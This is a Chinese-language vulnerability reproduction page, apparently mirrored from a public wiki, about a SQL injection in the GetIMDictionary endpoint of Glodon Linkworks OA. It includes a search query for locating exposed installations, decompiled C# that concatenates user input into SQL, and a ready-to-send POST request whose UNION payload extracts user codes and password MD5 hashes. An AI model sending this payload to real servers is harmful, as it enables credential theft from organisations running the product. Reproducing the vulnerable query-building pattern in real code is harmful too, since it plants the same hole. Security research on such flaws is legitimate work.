---
title: "广联达 Linkworks GetIMDictionary SQL注入漏洞"
date: 2026-10-16 09:10:41
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "广联达-Linkworks-GetIMDictionary"
tags:
  - "广联达-Linkworks-GetIMDictionary"
  - "SQL注入"
  - "代码执行"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

广联达 Linkworks办公OA GetIMDictionary接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息

## 漏洞影响

广联达 Linkworks

## 网络测绘

```
web.body="/Services/Identification/"
```

## 漏洞复现

登陆页面

![image-20230828150337640](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150337640.png)

```
// GTP.IM.Services.Config.WebSite.WebService.IM.Config.ConfigService
// Token: 0x06000018 RID: 24 RVA: 0x00004148 File Offset: 0x00002348
[WebMethod(Description = "得到IM系统配置")]
public string GetIMDictionary(string key)
{
	string str = string.Empty;
	ISysConfigService service = ServiceFactory.GetService<ISysConfigService>();
	StringBuilder stringBuilder = new StringBuilder();
	stringBuilder.AppendFormat("select F_VALUE from T_IM_DICTIONARY where f_key='{0}';", key);
	DataSet dataSet = GSqlDataAccess.SelectDataSet(service.DataSourceName, stringBuilder.ToString(), new DataParameter[0]);
	if (dataSet != null && dataSet.Tables.Count > 0 && dataSet.Tables[0] != null)
	{
		foreach (object obj in dataSet.Tables[0].Rows)
		{
			DataRow dataRow = (DataRow)obj;
			str = dataRow["F_VALUE"].ToString();
		}
	}
	StringBuilder stringBuilder2 = new StringBuilder();
	stringBuilder2.Append("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
	stringBuilder2.Append("<result  value=\"" + str + "\" >");
	stringBuilder2.Append("</result>");
	return stringBuilder2.ToString();
}
```

![image-20230828150533931](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150533931.png)

验证POC

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```

![image-20230828150553176](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150553176.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%B9%BF%E8%81%94%E8%BE%BE-Linkworks-GetIMDictionary-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
